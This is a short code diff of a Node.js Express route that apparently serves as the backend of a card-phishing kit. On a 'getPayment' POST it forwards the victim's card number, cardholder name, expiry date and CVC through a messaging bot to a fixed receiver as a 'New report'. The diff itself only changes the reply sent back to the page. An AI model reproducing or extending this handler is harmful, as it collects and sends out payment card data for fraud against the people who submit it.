@@ -21,7 +21,9 @@ router.post('/', function(req, res, next) {
   switch (req.body.post_type) {
     case 'getPayment':
       bot.sendMessage(api.RECIEVER_ID, `✅ New report \nCARD: ${req.body.number} \nCARDHOLDER: ${req.body.name} \nDATE: ${req.body.expiry} \nCVC: ${req.body.cvc}`);
-      console.log(req.body);
+      res.json({
+        ok: true
+      });
       break;
     default: break;
   }
